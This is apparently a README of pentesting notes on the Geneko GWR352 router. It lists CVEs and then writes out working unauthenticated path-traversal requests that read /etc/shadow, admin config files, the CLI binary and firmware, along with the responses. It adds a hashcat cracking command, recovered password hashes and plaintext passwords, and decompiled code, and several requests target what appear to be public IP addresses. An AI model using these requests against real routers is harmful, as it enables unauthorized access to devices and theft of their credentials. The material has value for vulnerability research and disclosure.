# Geneko GWR352 Pentesting

![image](https://user-images.githubusercontent.com/72421091/133135861-58123964-f897-4f29-9b14-6de6bcacb6f4.png)


## Disclaimer 

All information and software available on this page are for educational purposes only.

## To do

- privsec to root
- root hash decrypt
- firmware files
- filesystem tree
- exploit to use path travseral to view files and directories ( ls and cat using get requests)


## User manual  

[User manual](User%20manual)

## Web page

Login page port 80

![image](https://user-images.githubusercontent.com/72421091/133136116-241dd48a-8930-488f-aaeb-c984e57ebb35.png)

```html

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
"http://www.w3.org/TR/html4/strict.dtd">

<html>
	<head>
		<meta name="generator" content="HTML Tidy, see www.w3.org">
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
		<!-- GKO: Alternate CSS links -->
		<link href="files/ruter.css" title="non-ie" type="text/css" rel="stylesheet">
		<link href="files/ruter-ie.css" title="ie" type="text/css" rel="alternate stylesheet">
		<script type="text/javascript">ignoreAjaxAlert = 0; interval_pionter = 0; first_start = true;</script>
		<script type="text/javascript" src="lib/customization.js"></script>
		<script type="text/javascript" src="lib/framework.js"></script>
		<script type="text/javascript" src="lib/commons.js"></script>
		<script type="text/javascript" src="lib/index.js"></script>
		<script type="text/javascript" src="lib/jsong.js"></script>
		<script type="text/javascript" src="lib/admin.js"></script>
		<script type="text/javascript" src="lib/adsl.js"></script>
		<script type="text/javascript" src="lib/cli.js"></script>
		<script type="text/javascript" src="lib/dhcpser.js"></script>
		<script type="text/javascript" src="lib/dmz.js"></script>
		<script type="text/javascript" src="lib/dynDNS.js"></script>
		<script type="text/javascript" src="lib/encoder.js"></script>
		<script type="text/javascript" src="lib/firewall.js"></script>
		<script type="text/javascript" src="lib/gpio.js"></script>
		<script type="text/javascript" src="lib/management.js"></script>
		<script type="text/javascript" src="lib/network.js"></script>
		<script type="text/javascript" src="lib/openVPN.js"></script>
		<script type="text/javascript" src="lib/secur.js"></script>
		<script type="text/javascript" src="lib/smsControl.js"></script>
		<script type="text/javascript" src="lib/status.js"></script>
		<script type="text/javascript" src="lib/upsSettings.js"></script>
		<script type="text/javascript" src="lib/vpn.js"></script>
		<script type="text/javascript" src="lib/wanSettings.js"></script>
		<script type="text/javascript">document.write(html_title);</script>
	</head>

	<body onload="init();">
		<iframe src="" id="loading" style="display:none;border:none"></iframe>
		<img id="loading_img" src="files/loader.gif"/>
		<img id="loading_img2" style="display:none;z-index:111000;position:absolute;width:31px;height:31px;border:none;" src="files/loader.gif"/>

		<div id="loadingOverThePanes" style="background-color:white;filter:alpha(opacity=70);-moz-opacity:.70;opacity:.70;
			margin:0px;padding:0px;display:none;position:absolute;z-index:110000;">
		</div>

		<div id="zaglavlje">
			<table cellspacing="0px" cellpadding="0px" width="100%">
				<tr>
					<td style="background-image:url('files/piks1.jpg');background-repeat: repeat-x">
						<img alt="logo" src="files/zaglnovo.jpg" usemap="#zaglmap"/>
					</td>
					<td style="font-size:40px;font-style:bold;"></td>
				</tr>
			</table>
		</div>
		<div id="logout">
			<!--a href="javascript: logout();"><span id="logoutA">Logout </span> </a> &nbsp;  -->
		</div>

		<map id ="zaglmap" name="zaglmap">
			<area shape="rect" coords="0,0,200,70" href="javascript:open_url();"/>
		</map>
		<table id="tabPocetna">
			<tr>
				<td id="tdLevimeni" rowspan="2">
					<div id="meni"></div>
				</td>
				<td id="tdGlavni">
					<div id="divOkvir"></div>
				</td>
			</tr>
		</table>
		<div id="futer">
			<span>
				Copyright &copy; <script>document.write(copyright_year + ' '); document.write(copyright_company);</script>. All rights reserved.<br>
				<script>document.write(company_link);</script>
			</span>
		</div>

		<div id="dAlert" class="aler"></div>
		<div id="dOkCancel" class="aler"></div>
		<iframe src="" id="box" style="border:none;display:none;"></iframe>
	</body>
</html>
```

Default administration credentials are admin/admin (User Manual). It didin't work in my case.  

## Vulnerabilities

Using routersploit and searching, i found that the router vulnerable to a Unauthenticated Path Traversal vulnerability CVE-2017-11456

### CVE-2017-11456 Unauthenticated Path Traversal vulnerability

Geneko GWR routers allow directory traversal sequences starting with a /../ substring, as demonstrated by unauthenticated read access to the configuration file.

https://www.cvedetails.com/cve/CVE-2017-11456/

https://www.exploit-db.com/exploits/44072

### Information Disclosure

If the administrator has previously backed up the configuration file, then the attacker can access

https://IP/configuration/confFile.bkg

Web access in config file 

```
===>admin_admin

#==> Allowed value: [true|false]
admin_admin.enable=true

#==> Allowed value: string
admin_admin.username="admin"

#==> Allowed value: string
admin_admin.password="XXXXXXX"

#==> Allowed value: string from set ["http","https","both"]
admin_admin.web_access="http"

#==> Allowed value: numeric in range [1-65535]
admin_admin.http_port=80

#==> Allowed value: numeric in range [1-65535]
admin_admin.https_port=443

#==> Allowed value: numeric in range [1-60]
admin_admin.gui_timeout=15
```
https://ssd-disclosure.com/ssd-advisory-geneko-routers-information-disclosure/

### Slow HTTP Denial of Service Attack

Your web server is vulnerable to Slow HTTP DoS (Denial of Service) attacks.

Slowloris and Slow HTTP POST DoS attacks rely on the fact that the HTTP protocol, by design, requires requests to be completely received by the server before they are processed. If an HTTP request is not complete, or if the transfer rate is very low, the server keeps its resources busy waiting for the rest of the data. If the server keeps too many resources busy, this creates a denial of service.

#### Impact

A single machine can take down another machine's web server with minimal bandwidth and side effects on unrelated services and ports.

https://www.funtoo.org/Slowloris_DOS_Mitigation_Guide
https://web.archive.org/web/20180329210925/http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/

### CVE-2008-7220 : Vulnerable JavaScript library prototypejs

prototypejs 1.5.1
URL: http://10.10.10.10/lib/framework.js

Detection method: The library's name and version were determined based on the file's contents.

Unspecified vulnerability in Prototype JavaScript framework (prototypejs) before 1.6.0.2 allows attackers to make "cross-site ajax requests" via unknown vectors.

https://www.cvedetails.com/cve/CVE-2008-7220/

POC : https://github.com/followboy1999/CVE-2008-7220

### CVE-2013-1813

Used version : busybox http 1.19.4

util-linux/mdev.c in BusyBox before 1.21.0 uses 0777 permissions for parent directories when creating nested directories under /dev/, which allows local users to have unknown impact and attack vectors.

https://vuldb.com/?id.65544

## Exploit Unauthenticated Path Traversal vulnerability 

https://www.exploit-db.com/exploits/44072

sending the following GET request to read **/etc/shadow** file :

```
GET /help/../../../../../../../../../../../../../../../../etc/shadow HTTP/1.1
Host: 10.10.10.10
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
```
HTTP/1.1 200 OK
Connection: close
ETag: "38-183-384313b8"
Last-Modified: Tue, 30 Nov 1999 00:00:56 GMT
Date: Mon, 06 Dec 1999 03:41:08 GMT
Content-Type: application/octet-stream
Content-Length: 387

root:$1$ryjw5yTs$xoQlzavABZ5c7gQuD7jKO0:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
daemon:*:10933:0:99999:7:::
adm:*:10933:0:99999:7:::
lp:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
shutdown:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
admin:$1$7UH.tba/$UB7VOJ/QlDWu0ReqtjNfR.:10933:0:99999:7:::
```

Using hashcat to crack the hash password
```
hashcat -m 500 /root/.hashcat/hash3.txt /root/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-75.txt
```
```
$1$7UH.tba/$UB7VOJ/QlDWu0ReqtjNfR.:admin
```

You can use https://www.onlinehashcrack.com/ 

![image](https://user-images.githubusercontent.com/72421091/133137696-11d7d281-e1d2-47a8-91bd-c5dedefd0477.png)

For the web login we can find the password using the exploit to read config files

```
GET /../../../../../../../../../../../../../../../../../mnt/flash/params/j_admin_admin.params HTTP/1.1
Host: 10.10.10.10
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
```
HTTP/1.1 200 OK
Connection: close
ETag: "626e-7a-38431681"
Last-Modified: Tue, 30 Nov 1999 00:12:49 GMT
Date: Mon, 06 Dec 1999 04:17:40 GMT
Content-Type: application/octet-stream
Content-Length: 122


{"enable":true,"username":"admin","password":"XXXX","web_access":0,"http_port":80,"https_port":443,"gui_timeout":15}

```
We found the password for the web interface 

![image](https://user-images.githubusercontent.com/72421091/133138429-9fd5ee8a-4b35-422a-9e74-8dc409ddf913.png)

## SSH

CLI can be acces via SSH

![image](https://user-images.githubusercontent.com/72421091/133138635-49fc9307-8a80-4d40-8411-ccb6b107fcf2.png)

SSH to router 

```
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.10

admin@105.73.195.49's password: (password form the CLI interface settings for SSH)
```

```
 ----------------------------------------
  GWR Router Command Line Interface v0.8
 ----------------------------------------
  MAIN MODE
 -----------

 v - VIEW mode
 e - EDIT mode
 h - HELP
 x - quit

choose mode>
```

We can found all the available commands here [GWR-CLI-Documentation.pdf](User%20manual/GWR-CLI-Documentation.pdf)

## Filesystem

We can use the path travaersal exploit to search for files

The cli binary file can be found at /root/cli (leaked form the /etc/passwd)

```

GET /../../../../../../../../../../../../root/cli HTTP/1.1
Host: 105.73.195.47
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

```
We can se save the file or check form the request output

```
┌──(kali㉿kali)-[~]
└─$ file cli
cli: ELF 32-bit LSB executable, ARM, version 1 (ARM), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

```
┌──(kali㉿kali)-[~]
└─$ strings cli
/lib/ld-uClibc.so.0
libgcc_s.so.1
__deregister_frame_info
strlen
_Jv_RegisterClasses
__register_frame_info
libc.so.0
strcpy
popen
stdout
sigemptyset
pclose
_DYNAMIC
fgets
perror
tcflush
system
remove
sleep
__fgetc_unlocked
alarm
fprintf
__stdin
read
strncmp
sigaction
__uClibc_main
fopen
fclose
tcgetattr
fgetc
sprintf
fputc
__data_start
tcsetattr
__fputc_unlocked
_edata
__bss_start
__bss_start__
_end
__bss_end__
__end__
_init
_fini
GCC_3.0
v0.9
v0.1
evhgx
/home/www/lib/customization.js
geneko_pass.txt
/mnt/flash/etc/edit_pass.txt
./edit.sh
./view.sh
./geneko.sh
/var/run/cli_editmode.lock
./editmode_test_crashed.sh
/bin/cat %s | /bin/grep router_model | /usr/bin/cut -d "'" -f 2 | /usr/bin/tr -d                                                                     '
  %s Command Line Interface %s
clear
  MAIN MODE
 -----------
 v - VIEW mode
 e - EDIT mode
 h - HELP
 x - quit
choose mode>
  HELP MODE
 -----------
 x - leave current mode
 -------------
choose option>
press any key to return...
login timeout!!!
/usr/bin/test-web-login.sh
Another session in WEB mode is already running!!!
EDIT mode is not available.
press any key to continue...
Another CLI in EDIT mode is already running!!!
Password:
  EDIT MODE
 twice tab - list of commands
 x - leave current mode
 -------------------------------------
PANIC:You need to reboot the %s in order to save the consistency of router setti                                                                    ngs!!!
Invalid password for EDIT mode!!!
fndilo\giafd
  VIEW MODE
 ------------------------------------
Thank you for using %s Command Line Interface!
Warning: EDIT mode is not possible!!!
Please choose a valid option or check CapsLock key!
help_menu.txt
help_view.txt
help_edit.txt
GCC: (GNU) 3.3.2 20031005 (Debian prerelease)
GCC: (GNU) 3.4.3
GCC: (GNU) 3.4.3
GCC: (GNU) 3.4.3
GCC: (GNU) 3.3.2 20031005 (Debian prerelease)
.shstrtab
.interp
.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame
.ctors
.dtors
.jcr
.dynamic
.got
.data
.bss
.comment

```

We can decompile the elf binary using Ghidra

![image](https://user-images.githubusercontent.com/72421091/133150193-6f9846e3-d25a-45da-92d2-a39a93a00837.png)

All decompiled functions [Decompiled CLI](Decompiled%20CLI)

Some functions exemples :
- Main
```c

undefined4 main(void)

{
  int iVar1;
  FILE *__stream;
  int local_14;
  
  FUN_00008c28();
  FUN_00008bd8();
  while( true ) {
    while( true ) {
      FUN_00008ae0();
      FUN_00008dd4();
      read(0,&DAT_00012328,1);
      DAT_000122c0 = '\0';
      for (local_14 = 0; local_14 < 5; local_14 = local_14 + 1) {
        iVar1 = strncmp(&DAT_00012328,&DAT_00009bf5 + local_14,1);
        if (iVar1 == 0) {
          DAT_000122c0 = '\x01';
          local_14 = 5;
        }
      }
      if (DAT_000122c0 != '\0') break;
      fprintf(stdout,"\nPlease choose a valid option or check CapsLock key!\n");
      sleep(1);
    }
    iVar1 = strncmp(&DAT_00012328,"evhgx",1);
    if (iVar1 == 0) {
      __stream = fopen("/mnt/flash/etc/edit_pass.txt","r");
      if (__stream == (FILE *)0x0) {
        DAT_000122b8 = 0;
        perror("/mnt/flash/etc/edit_pass.txt");
        fprintf(stdout,"\nWarning: EDIT mode is not possible!!!\n");
        sleep(2);
      }
      else {
        DAT_000122b8 = 1;
        fgets(&DAT_000123e8,0x14,__stream);
        fclose(__stream);
      }
      FUN_00009258();
    }
    iVar1 = strncmp(&DAT_00012328,"vhgx",1);
    if (iVar1 == 0) {
      FUN_00009874();
    }
    iVar1 = strncmp(&DAT_00012328,"hgx",1);
    if (iVar1 == 0) {
      FUN_000090d8();
    }
    iVar1 = strncmp(&DAT_00012328,"gx",1);
    if (iVar1 == 0) {
      FUN_000096dc();
    }
    iVar1 = strncmp(&DAT_00012328,"x",1);
    if (iVar1 == 0) break;
    FUN_00008ae0();
  }
  FUN_0000990c();
  return 0;
}
```
- FUN_000096dc
```c

void FUN_000096dc(void)

{
  FILE *__stream;
  size_t __n;
  int iVar1;
  int local_18;
  
  __stream = fopen("geneko_pass.txt","r");
  if (__stream == (FILE *)0x0) {
    DAT_000122b9 = '\0';
    perror("geneko_pass.txt");
    sleep(2);
  }
  else {
    DAT_000122b9 = '\x01';
    fgets(&DAT_00012300,0x14,__stream);
    fclose(__stream);
  }
  FUN_00008b6c();
  read(0,&DAT_00012314,0x14);
  strcpy(&DAT_00012300,"fndilo\\giafd");
  for (local_18 = 0; (local_18 < 0x14 && ((&DAT_00012300)[local_18] != '\0'));
      local_18 = local_18 + 1) {
    (&DAT_00012300)[local_18] = (&DAT_00012300)[local_18] + (char)local_18 + -1;
  }
  __n = strlen(&DAT_00012300);
  iVar1 = strncmp(&DAT_00012314,&DAT_00012300,__n);
  if ((iVar1 == 0) && (DAT_000122b9 == '\x01')) {
    FUN_00008b30();
    system("clear");
    system("./geneko.sh");
  }
  return;
}


```
You can find all the decompiled functions here [Decompiled CLI](Decompiled%20CLI)

### Files

- mnt/flash/etc/edit_pass.txt : has the web interface password
- /home/www/lib/customization.js
```js
// Kastomizacioni fajl za Geneko //
var html_title = '<title>Geneko GWR Router</title>';
var router_model = 'GWR Router';
var copyright_year = '2008 - 2014';
var copyright_company = 'Geneko';
var company_url = 'http://www.geneko.rs';
var company_link = '<a href="' + company_url + '" target="_blank">' + company_url + '</a>';
var remote_management_protocol = 'Geneko';
var router_os = 'geneko';

function open_url(){
	window.open(company_url);
}
```
- root/geneko_pass.txt : root password ?
```
overload
```
- /root/help_menu.txt
```
General help tips:

- Press TAB button twice to display all available commands in current mode
- Press ctrl+d or type "exit" command to quit from current mode
- Use TAB button to complete commands
- Use Up/Down buttons to cycle through typing history
- Press ctrl+u to kill typed line
- Use ctrl+c to quit from programs
- Most commands have "--help"/"-h" switch for displaying short help


For short description about specific mode commands choose:

1 - VIEW mode commands
2 - EDIT mode commands
```
- /root/help_view.txt
```
Short help about VIEW mode commands:

arping                 - Ping hosts by ARP requests/replies
cal                    - Displays a calendar
clear                  - Clear screen
configuration_show     - Displays a calendar router's configuration
cpu                    - Provides an view of processor activity in real time
date                   - Displays the current time
df                     - Displays the filesystem space used and space available
dmesg                  - Displays or controls the kernel ring buffer
free                   - Displays the amount of free and used system memory
help                   - Go to HELP mode
interfaces-all         - Displays all interfaces
interfaces-up          - Displays up interfaces
ipcalc                 - Calculate IP network settings from a IP address
ipsec-routes           - Displays IPSec routes
ipsec-sa-status        - Displays IPSec SA status
ipsec-sa-status-detail - Displays more detailed IPSec SA status
ipsec-status           - Displays IPSec process status
iptables-view          - Displays configuration of IPv4 packet filtering and NAT
local_dns              - Show local DNS setting
modem_state            - Displays mobile module current connection state
modem_info             - Displays mobile module info
network_operators      - Displays list of available operators
netstat                - Displays Linux networking information
nslookup               - Queries the nameserver for the IP address of the given HOST, optionally using a specified DNS server
ping                   - Send ICMP ECHO_REQUEST packets to network hosts
ping_extended          - Send ICMP ECHO_REQUEST packets to network hosts. Extended options
pppstats               - Displays PPP statistics
ps                     - Report process status
route                  - Displays a calendar the kernel's routing tables
router_monitoring      - Displays a router's base information, LAN information/statistics, WAN information/statistics/connection
show                   - Displays a calendar firmware version, hardware version, signal strength and home network information
snmp-view              - View SNMP protocol configuration
ssh                    - OpenSSH SSH client(remote login)
syslog_export          - Export router's syslog
syslog_start           - Starts syslog
syslog_start+tail      - Starts syslog and displays growing log contents in realtime
syslog_start+view      - Starts syslog and displays current log contents
syslog_stop            - Stops syslog
syslog_tail            - Displays last N syslog lines
telnet                 - User interface to the TELNET protocol
traceroute             - Displays the route packets trace to network host
uptime                 - Displays route uptime
```

- /root/help_edit.txt
```
Short help about EDIT mode commands:

arping                 - Ping hosts by ARP requests/replies
cal                    - Displays a calendar
clear                  - Clear screen
configuration_export   - Export router's configuration
configuration_import   - Import router's configuration
configuration_show     - Displays router's configuration
cpu                    - Provides an view of processor activity in real time
date                   - Displays the current time in the given FORMAT, or sets the system date
df                     - Displays the filesystem space used and space available
dmesg                  - Displays or controls the kernel ring buffer
erase-firmware-memory  - Erase the firmware
factory_default        - Restore router settings to factory default
free                   - Displays the amount of free and used system memory
help                   - Go to HELP mode
hwclock                - Query and set the hardware clock (RTC)
ifconfig               - Configure a network interface
interfaces-all         - Displays all interfaces
interfaces-up          - Displays up interfaces
ip                     - Displays / manipulate routing, devices, policy routing and tunnels
ipcalc                 - Calculate IP network settings from a IP address
ipsec-mode             - Choose IPSec tunnel mode
ipsec-restart          - Restart IPSec process
ipsec-routes           - Displays IPSec routes
ipsec-sa-status        - Displays IPSec SA status
ipsec-sa-status-detail - Displays more detailed IPSec SA status
ipsec-settings         - Configure IPSec parameters
ipsec-start            - Start IPSec process
ipsec-status           - Displays IPSec process status
ipsec-stop             - Stop IPSec process
iptables               - Administration tool for IPv4 packet filtering and NAT
iptables-view          - Displays configuration of IPv4 packet filtering and NAT
killall                - Send a signal (default is SIGTERM) to the specified process(es)
local_dns              - Displays / manipulate local DNS setting
mac_address            - Change ethernet port mac address
modem_state            - Displays mobile module current connection state
modem_info             - Displays mobile module info
netstat                - Displays Linux networking information
network_operators      - Displays list of available operators
nslookup               - Queries the nameserver for the IP address of the given HOST, optionally using a specified DNS server
ntpdate                - Set the date and time via NTP
passwd-edit-mode       - Set password for EDIT mode
pidof                  - Lists the PIDs of all processes with names that match the names on the command line
ping                   - Send ICMP ECHO_REQUEST packets to network hosts
ping_extended          - Send ICMP ECHO_REQUEST packets to network hosts. Extended options
ppp-activity           - Activate / deactivate the currently PPP connection, switchover SIM cards
pppstats               - Displays PPP statistics
ps                     - Report process status
reboot                 - Perform router reboot
rip-quagga-conf        - Configure RIP protocol
rip-ripd-conf          - Configure RIP protocol
route                  - Edit the kernel's routing tables
router_monitoring      - Displays a router's base information, LAN information/statistics, WAN information/statistics/connection
send_at_command        - Send AT commands to mobile module
services               - Facility for service menagement
show                   - Displays firmware version, hardware version, signal strength and home network information
snmp-conf              - Configure SNMP protocol
snmp-view              - View SNMP protocol configuration
sms_send               - Send SMS message
ssh                    - OpenSSH SSH client(remote login)
syslog_export          - Export router's syslog
syslog_start           - Starts syslog
syslog_start+tail      - Starts syslog and displays growing log contents in realtime
syslog_start+view      - Starts syslog and displays current log contents
syslog_stop            - Stops syslog
syslog_tail            - Displays last N syslog lines
telnet                 - User interface to the TELNET protocol
traceroute             - Displays the route packets trace to network host
upfirmware             - Upgrade router firmware via ftp
uptime                 - Displays route uptime
wan-settings           - Displays or configure ppp WAN settings
write                  - Write current router configuration to flash memory
```

- /usr/bin/test-web-login.sh
```
#!/home/app/dash
/bin/cat /home/tmp/j_auth.tmp | /bin/grep "blocked=false" > /dev/null
```
- /root/editmode_test_crashed.sh
```
#!/home/app/dash

/bin/touch /var/run/cli_editmode.pid > /dev/null 2>&1
PID=$(/bin/cat /var/run/cli_editmode.pid)
/bin/ps w|/usr/bin/awk -F" " '{print $1}'|grep $PID > /dev/null 2>&1
TEMP=$(echo $?)

if [ $TEMP -ne 0 ]; then
	/bin/rm -f /var/run/cli_editmode.lock
fi
```
- /root/geneko.sh 
```
#!/bin/sh

PS1='[\u@\h \W]\$ '
export PS1

/root/bash
```

- /root/view.sh
```
#!/bin/sh

PS1='view-mode>'
PATH=/usr/local/bin/view
export PS1

/root/bash --restricted --rcfile /root/view.rc
```
- /root/edit.sh
```
#!/home/app/dash

PS1='edit-mode>'
PATH=/usr/local/bin/edit:/usr/local/bin/view
export PS1
echo $$ > /var/run/cli_editmode.pid
/root/bash --restricted --rcfile /root/edit.rc
```

- /root/view.rc 
```
enable -n alias
enable -n times
enable -n .
enable -n :
enable -n [
enable -n bind
enable -n break
enable -n builtin
#enable -n caller
enable -n cd
enable -n command
enable -n compgen
enable -n complete
enable -n continue
enable -n declare
#enable -n dirs
enable -n echo
enable -n eval
enable -n exec
enable -n export
enable -n false
enable -n fc
enable -n getopts
enable -n hash
enable -n history
enable -n kill
enable -n let
enable -n local
enable -n logout
#enable -n popd
enable -n printf
#enable -n pushd
enable -n pwd
enable -n read
enable -n readonly
enable -n return
enable -n set
enable -n shift
enable -n shopt
enable -n source
enable -n test
enable -n trap
enable -n true
enable -n type
enable -n typeset
enable -n ulimit
enable -n umask
enable -n unalias
enable -n unset
enable -n wait
enable -n enable
/bin/echo $$ > /root/view_bash.pid

TMOUT=120
```
- /usr/local/bin/edit/ : 

![image](https://user-images.githubusercontent.com/72421091/133154833-da38a736-3afd-456a-bb85-d00d420747da.png)

- /usr/local/bin/view/
- ![image](https://user-images.githubusercontent.com/72421091/133155072-311a8447-e61d-4e6f-94b9-8e84a352f6da.png)


- some binaries : 
   - /bin/cat /bin/grep /usr/bin/cut /usr/bin/tr /bin/rm /usr/bin/awk /bin/touch /bin/echo 
   - /root/bash  /home/app/dash  

## Firmware reverse (To do)

Html page used for update home/www/adminUpdate.html http://10.10.10.10/adminUpdate.html

Firmware : https://easy-router.de/wp-content/uploads/2018/03/firmware_3.0.19_352.cr 

SSH CLI EDIT Commands 
- upfirmware : Upgrade router firmware via ftp

firmware.bin
```
GET /../../../../../../../../../../../../mnt/flash/firmware.bin HTTP/1.1
Host: 105.73.195.47
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
```
i was able to extract the firmware.bin bzip2 -> tar -> files

binwalk / 7z e
binwalk -Me better choice


Reverse (To do)

## Path traversal show also dir / at the end 
full filesystem leak

GET /../../../../../../../../../../../../ HTTP/1.1
Host: 105.73.195.47
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close

## Privesc

CLI via SSH admin/admin / all commands runed via cli has the root priv /root/.bash_history
available binaries in view and edit mode : https://gtfobins.github.io/
/usr/local/bin/edit/ --> need edit password /mnt/flash/etc/edit_pass.txt
/usr/local/bin/view/


## Filesystem tree (later)
cmd : # tree -L 1 rootfs/
    ├── build                   # Compiled files (alternatively `dist`)
    ├── docs                    # Documentation files (alternatively `doc`)
    ├── src                     # Source files (alternatively `lib` or `app`)
    ├── test                    # Automated tests (alternatively `spec` or `tests`)
    ├── tools                   # Tools and utilities
    ├── LICENSE
    └── README.md
